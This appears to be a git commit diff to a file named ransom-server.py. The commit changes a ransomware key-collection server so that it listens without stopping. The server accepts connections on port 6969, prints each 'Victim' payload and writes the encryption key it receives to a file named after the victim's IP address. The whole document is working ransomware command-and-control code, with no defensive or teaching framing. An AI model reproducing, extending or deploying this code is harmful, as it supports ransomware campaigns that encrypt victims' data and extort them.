9ade8e8d615194febca731b903fb2ac9ab35cd8a
luigg2000 <luigg2000@gmail.com>
2022-12-28 19:29:56 +0000

    nonstop listening for keys

--- ransom-server.py
+++ ransom-server.py
@@ -1,24 +1,26 @@
 import socket
 
 def main():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
-    s.bind(('0.0.0.0', 6969)) # use bind method
-    s.listen() # wait for a connection
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
+        s.bind(('0.0.0.0', 6969)) # use bind method
+        s.listen() # wait for a connection
 
-    print("Listening...")
-    conn, addr = s.accept() # accept a connection, store connection and addres objects
-    print("Connection received from " + addr[0])
+        print("Listening...")
+        conn, addr = s.accept() # accept a connection, store connection and addres objects
+        print("Connection received from " + addr[0])
 
-    # receive the victim's data
-    data = conn.recv(4096).decode("UTF-8")
-    print("Victim: " + data)
+        # receive the victim's data
+        data = conn.recv(4096).decode("UTF-8")
+        print("Victim: " + data)
 
-    # After getting the data close the connection
-    s.close()
-    
-    with open(addr[0]+".key", "w") as f:
-        separator_index = data.index("Key:") + 4
-        f.write(data[separator_index:])
+        # After getting the data close the connection
+        s.close()
+        
+        # Save key to a file
+        with open(addr[0]+".key", "w") as f:
+            separator_index = data.index("Key:") + 4
+            f.write(data[separator_index:])
 
 
 if __name__ == "__main__":
